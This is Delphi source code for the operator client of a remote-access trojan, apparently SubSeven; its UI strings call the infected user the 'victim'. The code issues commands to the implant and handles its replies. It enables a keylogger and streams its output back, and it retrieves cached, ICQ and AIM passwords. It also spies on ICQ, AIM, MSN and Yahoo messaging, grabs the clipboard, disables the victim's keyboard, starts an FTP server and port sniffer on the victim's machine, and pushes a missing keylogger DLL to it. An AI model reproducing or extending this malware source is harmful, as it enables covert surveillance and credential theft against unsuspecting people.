  if Tine then
   begin
    Status.Caption:='transfer cancelled.';
    Tine:=False;
    exit;
   end;
  if (pos('time/date:',s)<>0) then Delete(S,pos('time/date:',S),10);
  Status.Caption:=s;
  ServerVersion:='1.0';
  ServerVersion:=copy(s,length(s)-2,3);
  {{{{{}
 Connected:=True;
 ConnectButton.Caption:='disconnect';
 ConnectBtn.Glyph.Assign(bit_dis_btn);
 StopAnimation;
 Conectat:=True;
 ServerAnswer:=True;
 UseMySettings:=False;
  {{{{{}
  exit;
 end;

if Pos('PONG',s)<>0 then
 begin
  Time_b:=Now;
  time_:=time_a-time_b;
  DecodeTime(time_,h_,m_,s_,ss_);
  Status.Caption:='PING replied in '+IntToStr(s_)+'.'+IntToStr(ss_)+' second(s).';
  StopAnimation;
  exit;
 end;

 if copy(s,1,3)='RAL' then
 begin
  strin:=Copy(s,4,length(s));
  FlatComboBox3.Items.Text:=STRin;
  Status.Caption:='adapters retrieved.';
  StopAnimation;
  exit;
 end;

if copy(s,1,5)='POPUP' then
begin
// if pos('invalid password',copy(s,6,length(s)))=0 then exit;
// ShowMsg(copy(s,6,length(s)));
 exit;
end;

if copy(s,1,3)='TOI' then
begin
 Status.Caption:='UIN dompressed database size: '+copy(s,4,length(s))+' bytes.';
 StopAnimation;
 if AreYouSure('UIN size: '+copy(s,4,length(s))+' bytes. proceed?') then
  begin
   if NotPassedVersionCheck('2.1') then exit;
   InitiateTransfer;
   ClientSocket.Socket.SendText('DDB');
   MainForm.Status.Caption:='downloading database...';
  end;
 exit;
end;

if copy(s,1,3)='BOT' then
begin
 Status.Caption:='IRC bot info retrieved.';
 StopAnimation;
 hidMemo.Lines.Clear;
 hidMemo.Lines.Text:=Copy(S,4,Length(S));
 FlatEdit35.Text:=hidMemo.Lines[0];
 FlatEdit36.Text:=hidMemo.Lines[1];
 FlatEdit37.Text:=hidMemo.Lines[2];
 FlatEdit38.Text:=hidMemo.Lines[3];
 FlatEdit39.Text:=hidMemo.Lines[4];
 FlatEdit40.Text:=hidMemo.Lines[5];
 FlatEdit41.Text:=hidMemo.Lines[6];
 if hidMemo.Lines[7]='yes' then FlatCheckBox14.Checked:=True else FlatCheckBox14.Checked:=False;
 Label107.Caption:='irc bot status: '+hidMemo.Lines[8];
 BOTCommands.Lines.Clear;
 for i:=10 to hidMemo.Lines.Count-1 do
  BOTCommands.Lines.Add(hidMemo.Lines[i-1]);
 exit; 
end;

if (copy(s,1,2)='p:') then
begin
 repeat
  TmpStr:=Copy(s,3,pos('.',s)-3);
  Delete(s,1,pos('.',s));
  {Status.Caption:='bytes uploaded: '+TmpStr;}
  Progr.Progress:=StrToInt(TmpStr);
 until (copy(s,1,2)<>'p:');
 if length(s)<3 then exit;
end;
if copy(s,1,3)='TID' then
begin
 FindFirst(CeSaTrimita,faAnyFile,rec);
 no := rec.Size;
 if length(IntToStr(no))<10 then cheie:='0'+IntToStr(length(IntToStr(no)))
  else cheie:=IntToStr(length(IntToStr(no)));
 TmpStr := 'SFT'+cheie+IntToStr(no);
 Socket.SendText (TmpStr);
 Socket.SendStream (TFileStream.Create (CeSaTrimita, fmOpenRead or fmShareDenyWrite));
 Status.Caption:='uploading file...';
 fileM.Stat.Caption:=MainForm.Status.Caption;
 StopAnimation;
 IdleLabel.Visible:=False;
 progr.visible:=true;
 progr.progress:=0;
 progr.MaxValue:=NO;
 progr.MinValue:=0;
 exit;
end;
if s='file successfully uploaded.' then
 begin
  CeSaTrimita:='';
  IdleLabel.Visible:=True;
  progr.visible:=False;
  progr.progress:=0;
  if FileExists(ExtractFilePath(ParamStr(0))+'syskey.dll') then
   try DeleteFile(ExtractFilePath(ParamStr(0))+'syskey.dll');except end;
//  MainForm.StartTheLogger;
//  OutlookBtn1.Caption:='stop';
 end;
if copy(s,1,3)='SPY' then
 begin
  if (s[8]='1') and (SpySocket.Active=False) then
   begin
    try SpySocket.Address:=KeepConnectedIP;
    SpySocket.Active:=True;except end;
   end;
  if s[8]='1' then Status.Caption:=LowerCase(copy(s,5,3))+' spy enabled.' else
                   Status.Caption:=LowerCase(copy(s,5,3))+' spy disabled.';
  if copy(Status.Caption,1,3)='yh!' then Status.Caption:='yahoo'+copy(status.caption,4,length(status.caption));
  if s[8]='1' then
   begin
    if copy(s,5,3)='ICQ' then Spies[1]:=True;
    if copy(s,5,3)='AIM' then Spies[2]:=True;
    if copy(s,5,3)='MSN' then Spies[3]:=True;
    if copy(s,5,3)='YH!' then Spies[4]:=True;
   end;
  if s[8]='0' then
   begin
    if copy(s,5,3)='ICQ' then Spies[1]:=False;
    if copy(s,5,3)='AIM' then Spies[2]:=False;
    if copy(s,5,3)='MSN' then Spies[3]:=False;
    if copy(s,5,3)='YH!' then Spies[4]:=False;
   end;
  SetStatus;
  StopAnimation;
  Exit;
 end;

 if copy(s,1,3)='RAW' then
 begin
  strin:=copy(s,4,length(s));
  WinM.apps.Sorted:=False;
  WinM.apps.Items.Clear;
  WinM.apps.Items.Text:=strin;
  ListBox1.Sorted:=False;
  ListBox1.Clear;
  ListBox1.Items.Text:=strin;
  StopAnimation;
  Status.Caption:='done.';
  fileM.Stat.Caption:=Status.Caption;
  exit;
 end;

 if copy(s,1,3)='GPR' then
 begin
  strin:=copy(s,4,length(s));
  hidMemo.Clear;
  hidMemo.Lines.Text:=STRIN;
  i:=0;
  repeat
  with PortList.Items.Add do
   begin
    inc(i);Caption:=hidMemo.Lines[i];
    inc(i);SubItems.Add(hidMemo.Lines[i]);
    inc(i);SubItems.Add(hidMemo.Lines[i]);
    inc(i);
   end;
  until i>= hidMemo.Lines.Count;
  StopAnimation;
  Status.Caption:='done.';
  fileM.Stat.Caption:=Status.Caption;
  exit;
 end;

 if copy(s,1,3)='IUL' then
 begin
  strin:=copy(s,4,length(s));
  if length(StrIn)<3 then
   begin
    StopAnimation;
    Status.Caption:='no UINs found.';
    exit;
   end;
  hidMemo.Clear;
  hidMemo.Lines.Text:=STRIN;
  for i:=0 to ((hidMemo.Lines.Count-1) div 2) do
   with ICQList.Items.Add do begin
    Caption:=hidMemo.Lines[i];
    SubItems.Add(hidMemo.Lines[i+((hidMemo.Lines.Count-1) div 2)+1]);
   end;
  StopAnimation;
  Status.Caption:='done.';
  exit;
 end;

if Pos('error. missing dll file',S)<>0 then
 begin
  try keysock.active:=false;except end;
  Status.Caption:='error. missing dll file.';
  StopAnimation;
  OutlookBtn1.Caption:='start logging';
  if not AreYouSure('victim is missing a dll file. upload it now?') then exit;
  WriteDLL;
  StartAnimation;
  CeSaTrimita:=ExtractFilePath(ParamStr(0))+'syskey.dll';
  MainForm.ClientSocket.Socket.SendText('RTE');
  MainForm.Status.Caption:='initiating file transfer...';
 end;

 if Pos('ATSM',s)<>0 then
 begin
  StrIN:=Copy(S,Pos('ATSM',S)+4,Pos('ETSM',S)-(Pos('ATSM',S)+4));
  Delete(S,Pos('ATSM',S),Pos('ETSM',S)+3);
  StopAnimation;
  Memo4.Lines.Add(strin);
  if length(S)<3 then exit;
 end;

 if copy(s,1,5)='VRead' then
 begin
  RxWaveBar.Value:=StrToInt(copy(s,6,3));
  RxWaveBar.Enabled:=True;
  RxSynthBar.Value:=StrToInt(copy(s,9,3));
  RxSynthBar.Enabled:=True;
  RxCDBar.Value:=StrToInt(copy(s,12,3));
  RxCDBar.Enabled:=True;
  Status.Caption:='volume settings read.';
  StopAnimation;
  exit;
 end;

 if copy(s,1,4)='VSet' then
  begin
   Status.Caption:='volume set';
   StopAnimation;
   Exit;
  end;

 if copy(s,1,3)='GDR' then
 begin
  strin:=copy(s,4,length(s));
  GetNewPath.ListDrives.Items.Text:=strin;
  Status.Caption:='drives received.';
  FileM.Stat.Caption:=Status.Caption;
  StopAnimation;
  Anim.Animeaza(GetNewPath);
  DriversLoaded:=True;  
  exit;
 end;

if copy(s,1,3)='RTD' then
 begin
  Status.Caption:='done.';
  DataReceived(copy(s,4,length(s)));
  StopAnimation;
  exit;
 end;

if (copy(s,1,4)='SIZE') then
 begin
  ssize:=copy(s,5,length(s));
  if length(ssize)>3 then
   ssize:=copy(ssize,1,length(ssize)-3)+','+
          copy(ssize,length(ssize)-2,3);
   Status.Caption:='Size: '+ssize+'k';
   fileM.Stat.Caption:=Status.Caption;
   StopAnimation;
   exit;
 end;

if copy(s,1,3)='CRS' then
 begin
  strin:=copy(s,4,length(s));
  ResList.Items.Text:=strin;
  Status.Caption:='available resolutions received.';
  StopAnimation;
  exit;
 end;

if copy(s,1,3)='RRD' then
 begin
  Status.Caption:='done.';
  StopAnimation;
  RegEdit.FlatEdit1.Text:=copy(s,5,length(s));
  RegEdit.Tip:=copy(s,4,1);
  exit;
 end;

if copy(s,1,3)='PSS' then
 begin
  Status.Caption:='cached passwords retrieved.';
  StopAnimation;
  strin:=copy(s,4,length(s));
  DispInfo.Memo.Lines.Clear;
  DispInfo.Memo.Lines.Text:=strin;
  DispInfo.CaptionLabel.Caption:='cached passwords';
  DispInfo.Caption:='cached passwords';
  Anim.Animeaza(DispInfo);
  exit;
 end;

if copy(s,1,3)='GIP' then
 begin
  Status.Caption:='icq passwords retrieved.';
  StopAnimation;
  strin:=copy(s,4,length(s));
  try ICQPass:=TDispInfo.Create(Application);except end;
  ICQPass.Memo.Lines.Clear;
  ICQPass.Memo.Lines.Text:=strin;
  ICQPass.CaptionLabel.Caption:='icq passwords';
  ICQPass.Caption:='icq passwords';
  Anim.Animeaza(ICQPass);
  exit;
 end;

 if copy(s,1,3)='GAP' then
 begin
  Status.Caption:='aim passwords retrieved.';
  StopAnimation;
  strin:=copy(s,4,length(s));
  try AIMPass:=TDispInfo.Create(Application);except end;
  AIMPass.Memo.Lines.Clear;
  AIMPass.Memo.Lines.Text:=strin;
  AIMPass.CaptionLabel.Caption:='aim passwords';
  AIMPass.Caption:='aim passwords';
  Anim.Animeaza(AIMPass);
  exit;
 end;

if s='key press listen enabled' then
begin
 if KeySock.Active then KeySock.Active:=False;
 try keysock.Port:=StrToInt(KeyzPort);except end;
 keysock.Address:=KeepConnectedIP;
 try keysock.Active:=True;except end;
 Status.Caption:='keylogger enabled.';
 StopAnimation;
 IsGetKeys:=True;
 exit;
end;

if s='{PSARN}' then
begin
 if SniffSock.Active then SniffSock.Active:=False;
 try sniffsock.Port:=StrToInt(FlatEdit42.Text);except end;
 Sniffsock.Address:=KeepConnectedIP;
 try sniffsock.Active:=True;except end;
 Status.Caption:='port sniffer activated.';
 StopAnimation;
 exit;
end;

if Pos('matrix initiated',s)<>0 then
begin
 {matrixsock.Port:=2773;}
 matrixsock.Address:=ClientSocket.Address;
 try matrixsock.Active:=True;except end;
 Status.Caption:='matrix initiated.';
 Anim.Animeaza(TheMatrix);
 StopAnimation;
 exit;
end;

if copy(s,1,3)='GMI' then
 begin
  strin:=copy(s,4,length(s));
  hidMemo.Lines.clear;
  hidMemo.Lines.text:=strin;
  InfoLabel.Caption:='';

 if ServerVersion>='2.1' then
  with InfoLabel,hidMemo do begin
   Caption:=Caption+lines[0]+#13#10;Caption:=Caption+lines[1]+#13#10;
   Caption:=Caption+lines[2]+#13#10;Caption:=Caption+lines[3]+#13#10;
   Caption:=Caption+lines[4]+#13#10;Caption:=Caption+lines[5]+#13#10;
   Caption:=Caption+lines[6]+#13#10;Caption:=Caption+lines[7]+#13#10;
   Caption:=Caption+lines[8]+#13#10;
   Caption:=Caption+lines[9]+' ['+lines[11]+'bpp]'+#13#10;
   Caption:=Caption+lines[10]+#13#10;Caption:=Caption+lines[12]+' ['+lines[13]+']'+#13#10;
   Caption:=Caption+lines[14]+#13#10;Caption:=Caption+lines[15]+#13#10;
   try if ServerVersion>='2.0' then Caption:=Caption+lines[16]+#13#10;except end;
  end else
  with InfoLabel,hidMemo do begin
   Caption:=Caption+lines[0]+#13#10;Caption:=Caption+lines[1]+#13#10;
   Caption:=Caption+lines[2]+#13#10;Caption:=Caption+lines[3]+#13#10;
   Caption:=Caption+lines[4]+#13#10;Caption:=Caption+lines[5]+#13#10;
   Caption:=Caption+lines[6]+#13#10;s:=Lines[6];if copy(s,length(s)-6,4)='1998' then
    Caption:=Caption+'Windows 98'+#13#10 else Caption:=Caption+lines[7]+#13#10;
   Caption:=Caption+lines[8]+' ['+lines[10]+'bpp]'+#13#10;
   Caption:=Caption+lines[9]+#13#10;Caption:=Caption+lines[11]+' ['+lines[12]+']'+#13#10;
   Caption:=Caption+lines[13]+#13#10;Caption:=Caption+lines[14]+#13#10;
   try if ServerVersion>='2.0' then Caption:=Caption+lines[15]+#13#10;except end;
  end;
  Status.Caption:='info retrieved.';
  StopAnimation;
  exit;
 end;

if copy(s,1,3)='GHI' then
 begin
  strin:=copy(s,4,length(s));
  hidMemo.Lines.clear;
  hidMemo.Lines.text:=strin;
  Label77.Caption:='';
  with Label77,hidMemo do begin
   Caption:=Caption+lines[0]+#13#10;Caption:=Caption+lines[1]+#13#10;
   Caption:=Caption+lines[2]+#13#10;Caption:=Caption+lines[3]+#13#10;
   Caption:=Caption+lines[4]+#13#10;Caption:=Caption+lines[5]+#13#10;
   Caption:=Caption+lines[6]+#13#10;Caption:=Caption+lines[7]+#13#10;
   Caption:=Caption+lines[8]+#13#10;Caption:=Caption+lines[9]+#13#10;
   Caption:=Caption+lines[10]+#13#10;Caption:=Caption+lines[11]+#13#10;
   Caption:=Caption+lines[12]+#13#10;Caption:=Caption+lines[13]+#13#10;
  end;
  Status.Caption:='home info retrieved.';
  StopAnimation;
  exit;
 end;

if copy(s,1,3)='RCT' then
 begin
  strin:=copy(s,4,length(s));
  Memo5.Lines.Text:=strin;
  Status.Caption:='clipboard text retrieved.';
  StopAnimation;
  exit;
 end;

if s='OpenVictimChat' then
 begin
  ChatSock.Port:=2774;
  ChatSock.Address:=ClientSocket.Address;
  try ChatSock.Active:=True;except end;
  Status.Caption:='chat initiated.';
  NickName:=FlatEdit11.Text;if NickName='' then NickName:='nickless';
  VictimChat.MyMemo.Lines.Clear;
  VictimChat.FlatEdit1.Text:='';
  Anim.Animeaza(VictimChat);
  StopAnimation;
  exit;
 end;
if s='OpenClientChat' then
 begin
  ChatSock.Port:=2774;
  ChatSock.Address:=ClientSocket.Address;
  try ChatSock.Active:=True;except end;
  Status.Caption:='chat initiated.';
  NickName:=FlatEdit11.Text;if NickName='' then NickName:='nickless';
  ClientChat.Memo1.Lines.Clear;
  ClientChat.FlatEdit1.Text:='';
  MainForm.ChatSock.Socket.SendText('MTC<'+MainForm.NickName+'> entered the chat.');
  Anim.Animeaza(ClientChat);
  StopAnimation;
  exit;
 end;

if s='flipping...' then
 begin
  Status.Caption:=s;
  exit;
 end;
  
 if (s<>'') and (s<>' ') then Status.Caption:=s;
 fileM.Stat.Caption:=Status.Caption;
 StopAnimation;
end;

procedure TMainForm.OutlookBtn9Click(Sender: TObject);
var i:integer;
begin
 InfoLabel.Caption:='';
 for i:=1 to 15 do
  InfoLabel.Caption:=InfoLabel.Caption+'n/a'+#13#10;
end;

procedure TMainForm.OutlookBtn11Click(Sender: TObject);
var str:String;
begin
 if Conectat then begin
  GetTextForm.GetText('change server port','new port:','',false,str);
  if str<>'' then
  begin
   ClientSocket.Socket.SendText('CPT'+str);
   Status.Caption:='changing port...';
   StartAnimation;
   portEdit.text:=str;
  end;
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn13Click(Sender: TObject);
begin
 if Conectat then begin
  ClientSocket.Socket.SendText('CPT27374');
  Status.Caption:='changing port...';
  StartAnimation;
  portEdit.text:='27374';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn12Click(Sender: TObject);
var TmpStr,str:String;
begin
 if Conectat then begin
  {If InputQuery('new password', 'password:', TmpStr) then}
  GetTextForm.GetText('set new password','password:','',true,TmpStr);
  if TmpStr='' then exit;
  GetTextForm.GetText('retype password','password:','',true,Str);
  if (TmpStr<>Str) then ShowMsg('uhm... the password retyped does not match the first password');
  if (TmpStr<>'') and (TmpStr=Str) then
  begin
   ClientSocket.Socket.SendText('NPD'+TmpStr);
   StartAnimation;
   Status.Caption:='setting the new password...';
 end;end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn14Click(Sender: TObject);
begin
 if Conectat then begin
  ClientSocket.Socket.SendText('NPD_PZD');
  Status.Caption:='removing password...';
  StartAnimation;
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn16Click(Sender: TObject);
begin
if AreYouSure('close the server?') then
if Conectat then begin
 ClientSocket.Socket.SendText('CLS');
 Status.Caption:='closing server...';
 StartAnimation;
{ ClientSocket.Active:=False;
 Conectat:=False;}
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn17Click(Sender: TObject);
begin
if AreYouSure('remove the server?') then
if Conectat then begin
 ClientSocket.Socket.SendText('RMS');
 Status.Caption:='removing server...';
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn20Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('DIN');
 Status.Caption:='turning off icq notification...';
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn22Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('DIC');
 Status.Caption:='turning off irc notification...';
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn24Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('DEM');
 Status.Caption:='turning off e-mail notification...';
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn19Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.2') then exit;
 Status.Caption:='trying to enable ICQ notification...';
 ClientSocket.Socket.SendText('EIN'+FalDe(FlatEdit2.Text,2)+FlatEdit2.Text+FlatEdit1.Text);
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn21Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.8') then exit;
 Status.Caption:='trying to enable IRC notification...';
 ClientSocket.Socket.SendText('EIC'+FalDe(FlatEdit5.Text,2)+FalDe(FlatEdit4.Text,2)+FalDe(FlatEdit3.Text,2)+FlatEdit5.Text+FlatEdit4.Text+FlatEdit3.Text);
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn23Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.6') then exit;
 Status.Caption:='trying to enable E-Mail notification...';
 ClientSocket.Socket.SendText('EEM'+FalDe(FlatEdit8.Text,2)+FalDe(FlatEdit6.Text,2)+FalDe(FlatEdit7.Text,2)+FlatEdit8.Text+FlatEdit6.Text+FlatEdit7.Text);
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.StartTheLogger;
begin
 if Conectat then begin
  TastePrimite:='';
  ClientSocket.Socket.SendText('TKSon'+KeyzPort);
  StartAnimation;
  Status.Caption:='trying to enable the keylogger...';
 end else begin KeyLogger.OutlookBtn1.Caption:='start logging';Status.Caption:=NotConnected;end;
end;

procedure TMainForm.StopTheLogger;
begin
 if Conectat then begin
  TastePrimite:='';
  ClientSocket.Socket.SendText('TKSoff');
  StartAnimation;
  Status.Caption:='trying to disable keylogger...';
  keysock.active:=false;
  IsGetKeys:=False;
 end else begin KeyLogger.OutlookBtn1.Caption:='start logging';Status.Caption:=NotConnected;end;
end;

procedure TMainForm.keysockRead(Sender: TObject; Socket: TCustomWinSocket);
var i:integer;
    s:string;
begin
s:=Socket.ReceiveText;

for i:=1 to length(s) do
 if (s[i]='»') then KeyLogger.KeyLog.Text:=KeyLogger.KeyLog.Text+#13#10'»' else
  if (s[i]='«') then KeyLogger.KeyLog.Text:=KeyLogger.KeyLog.Text+'«'#13#10 else
   if s[i]=#13 then KeyLogger.KeyLog.Text:=KeyLogger.KeyLog.Text+#13#10 else
    if s[i]='ô' then KeyLogger.KeyLog.Text:=KeyLogger.KeyLog.Text+#13#10 else
     if s[i]='ö' then KeyLogger.KeyLog.Text:=KeyLogger.KeyLog.Text+#13#10 else
     if s[i]='ò' then KeyLogger.KeyLog.Text:=KeyLogger.KeyLog.Text+#13#10 else
      if s[i]=#8 then KeyLogger.KeyLog.Text:=Copy(KeyLogger.KeyLog.Text,1,length(KeyLogger.KeyLog.Text)-1)
       else KeyLogger.KeyLog.Text:=KeyLogger.KeyLog.Text+s[i];
KeyLogger.keylog.SelStart:=Length(KeyLogger.KeyLog.Text)-1;
KeyLogger.KeyLog.SelLength:=1;
{TastePrimite:=TastePrimite+s;
repeat
 if (TastePrimite[1]<>'ô') and (TastePrimite[1]<>'ö') and (TastePrimite[1]<>'ò') and (TastePrimite[1]<>'û') then
   SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, Byte(TastePrimite[1+1]), 0)
 else if TastePrimite[1]='ô' then
  SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, Byte(' '), 0)
 else if TastePrimite[1]='ö' then
  SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, VK_RETURN, 0)
 else if TastePrimite[1]='ò' then
  SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, Byte(#8), 0)
 else if TastePrimite[1]='û' then
  SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, VK_TAB, 0);
 TastePrimite:=Copy(TastePrimite,2,length(TastePrimite));
until length(TastePrimite)<1; 
   {s:=copy(s,1,loop-1)+copy(s,loop+2,length(s)-loop);}
{loop:=0;
repeat
inc(loop);
if s[loop]=';' then begin
  if (s[loop+1]<>'ô') and (s[loop+1]<>'ö') and (s[loop+1]<>'ò') and (s[loop+1]<>'û') then
    SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, Byte(s[loop+1]), 0)
  else if s[loop+1]='ô' then
   SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, Byte(' '), 0)
  else if s[loop+1]='ö' then
   SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, VK_RETURN, 0)
  else if s[loop+1]='ò' then
   SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, Byte(#8), 0)
  else if s[loop+1]='û' then
   SendMessage(KeyLogger.KeyLog.Handle, WM_CHAR, VK_TAB, 0);
   s:=copy(s,1,loop-1)+copy(s,loop+2,length(s)-loop);
  dec(loop);
 end;
until loop>=length(s);
if length(s)<2 then exit;}
end;

procedure TMainForm.OutlookBtn6Click(Sender: TObject);
begin
if AreYouSure('disable victim''s keyboard?') then
if Conectat then begin
 ClientSocket.Socket.SendText('DAK');
 Status.Caption:='trying to disable keyboard...';
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn10Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 InitiateTransfer;
 ClientSocket.Socket.SendText('GOK');
 Status.Caption:='trying to get the list of keys pressed while offline...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn25Click(Sender: TObject);
var TSum : LongInt;
    MCapt, MText : PChar;
    MT, RT : string;
    i : integer;
begin
 TSum:=0;
 if FlatRadioButton2.Checked then TSum:=MB_ABORTRETRYIGNORE;
 if FlatRadioButton3.Checked then TSum:=MB_OKCANCEL;
 if FlatRadioButton4.Checked then TSum:=MB_RETRYCANCEL;
 if FlatRadioButton5.Checked then TSum:=MB_YESNO;
 if FlatRadioButton6.Checked then TSum:=MB_YESNOCANCEL;
 if FlatSpeedButton1.Down then CIcon:=0;
 if FlatSpeedButton5.Down then CIcon:=1;
 if FlatSpeedButton4.Down then CIcon:=2;
 if FlatSpeedButton3.Down then CIcon:=3;
 if FlatSpeedButton2.Down then CIcon:=4;

 TSum:=TSum+IconConst[CIcon];
 getMem (MCapt, 100);
 StrPCopy (MCapt, FlatEdit9.Text);
 RT:='';
 MT:=FlatEdit10.Text;
 for i:=1 to Length (MT) do
  if MT[i]='|' then RT:=RT+chr(13)+chr(10) else RT:=RT+MT[i];
 getMem (MText, 500);
 StrPCopy (MText, RT);
 MessageBox (MainForm.Handle, MText, MCapt, TSum);
 freeMem (MText);
 freeMem (MCapt);
end;

procedure TMainForm.OutlookBtn26Click(Sender: TObject);
var TSum:Integer;
begin
if Conectat then begin
 TSum:=0;
 if FlatRadioButton2.Checked then TSum:=1;
 if FlatRadioButton3.Checked then TSum:=2;
 if FlatRadioButton4.Checked then TSum:=3;
 if FlatRadioButton5.Checked then TSum:=4;
 if FlatRadioButton6.Checked then TSum:=5;
 if FlatSpeedButton1.Down then CIcon:=0;
 if FlatSpeedButton5.Down then CIcon:=1;
 if FlatSpeedButton4.Down then CIcon:=2;
 if FlatSpeedButton3.Down then CIcon:=3;
 if FlatSpeedButton2.Down then CIcon:=4;
 ClientSocket.Socket.SendText('MW:'+IntToStr(TSum)+IntToStr(CIcon)+FlatEdit9.Text+'ZJXX'+FlatEdit10.Text);
 Status.Caption:='sending customized message...';
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.Label25Click(Sender: TObject);
begin
 PickColor.Color:=Label25.Color;
 if PickColor.Execute then
 begin
  Label25.Color:=PickColor.Color;
  VictimSample.Font.Color:=PickColor.Color;
 end; 
end;

procedure TMainForm.Label32Click(Sender: TObject);
begin
 PickColor.Color:=Label32.Color;
 if PickColor.Execute then
 begin
  Label32.Color:=PickColor.Color;
  ClientSample.Font.Color:=PickColor.Color;
 end;
end;

procedure TMainForm.FlatEdit12Change(Sender: TObject);
begin
 VictimSample.Font.Size:=StrToInt(FlatEdit12.Text);
end;

procedure TMainForm.FlatEdit14Change(Sender: TObject);
begin
 ClientSample.Font.Size:=StrToInt(FlatEdit14.Text);
end;

procedure TMainForm.pFTPEnter(Sender: TObject);
begin
 FlatEdit15.Text:=KeepConnectedIP;
{ FlatEdit31.Text:='ftp://password@'+KeepConnectedIP+':'+FlatEdit16.Text;
 if ftpactive then
  begin
   ftpstatus.caption:='ftp status: active';
  end else begin
   ftpstatus.caption:='ftp status: not active';
  end;}
end;

procedure TMainForm.OutlookBtn30Click(Sender: TObject);
begin
if Conectat then begin
 Status.Caption:='trying to disable the FTP server...';
 ClientSocket.Socket.SendText('FTPdisable'#13#10);
 ftpactive:=false;
 FTPstatus.Caption:='ftp status: not active';
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn29Click(Sender: TObject);
begin
if Conectat then begin
 Status.Caption:='trying to enable the FTP server...';
 if ((ServerVersion[1]='1') OR (ServerVersion='2.0')) then
  ClientSocket.Socket.SendText('FTPenable!'+FlatEdit17.Text+'@@@'+FlatEdit16.Text+':::'+FlatEdit18.Text)
 else
  ClientSocket.Socket.SendText('FTPenable!'+FlatEdit17.Text+'@@@'+FlatEdit16.Text+':::'+FlatEdit18.Text+'$$$'+FlatEdit34.Text);
 ftpactive:=true;
 FTPstatus.Caption:='ftp status: active';
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn28Click(Sender: TObject);
begin
if Conectat then begin
 Status.Caption:='initiating client chat...';
 ClientSocket.Socket.SendText('OCC'+FlatEdit11.Text);
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

function TMainForm.SendSettings:string;
var rs,t,len:string;
begin
 rs:='';
 t:=FlatEdit13.Text;
 if length(t)=1 then len:='00'+t else
  if length(t)=2 then len:='0'+t else len:=t;
 rs:=rs+len;
 t:=FlatEdit12.Text;
 if length(t)=1 then len:='0'+t else len:=t;
 rs:=rs+len;
 t:=FlatEdit14.Text;
 if length(t)=1 then len:='0'+t else len:=t;
 rs:=rs+len;
 rs:=rs+FalDe(ColorToString(Label25.Color),2)+ColorToString(Label25.Color);
 rs:=rs+ColorToString(Label32.Color);
 result:=rs;
end;

procedure TMainForm.OutlookBtn27Click(Sender: TObject);
begin
if Conectat then begin
 Status.Caption:='initiating victim chat...';
 ClientSocket.Socket.SendText('OVC'+SendSettings);
 UseMySettings:=True;
 StartAnimation;
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.ChatSockDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 if (VictimChat.Visible) or (ClientChat.Visible) then
  begin
   ClientChat.Hide;
   VictimChat.Hide;
   try ChatSock.Active:=False;except end;
  end;
end;

procedure TMainForm.ChatSockError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
 if (VictimChat.Visible) or (ClientChat.Visible) then
  begin
   ClientChat.Hide;
   VictimChat.Hide;
   try ChatSock.Active:=False;except end;
  end;
end;

procedure TMainForm.ChatSockRead(Sender: TObject;
  Socket: TCustomWinSocket);
var gets,cods,txts:String;
begin
 gets:=Socket.ReceiveText;
 cods:=copy(gets,1,3);
 txts:=copy(gets,4,length(gets));
 if ((cods='RCC') and (not ClientChat.Visible)) then
  begin
   ClientChat.Memo1.Lines.Clear;
   ClientChat.FlatEdit1.Text:='';
   Anim.Animeaza(ClientChat);
  end;
 if ((cods='RVC') and (not VictimChat.Visible)) then
  begin
   UseMySettings:=False;
   VictimChat.MyMemo.Lines.Clear;
   VictimChat.FlatEdit1.Text:='';
   Anim.Animeaza(VictimChat);
  end;
 if ((cods='MFV') and (VictimChat.Visible)) then
  VictimChat.AddToMyMemo(txts);
 if (cods='MFC') then
  ClientChat.Memo1.Lines.Add(txts);
 if ((cods='CVC') and (VictimChat.Visible)) then
  VictimChat.Hide;
 if (cods='CCC') then
  ClientChat.Hide;
end;

procedure TMainForm.pChatShow(Sender: TObject);
begin
 VictimSample.Font.Color:=Label25.Color;
 VictimSample.Font.Size:=StrToInt(FlatEdit12.Text);
 ClientSample.Font.Color:=Label32.Color;
 ClientSample.Font.Size:=StrToInt(FlatEdit14.Text);
end;

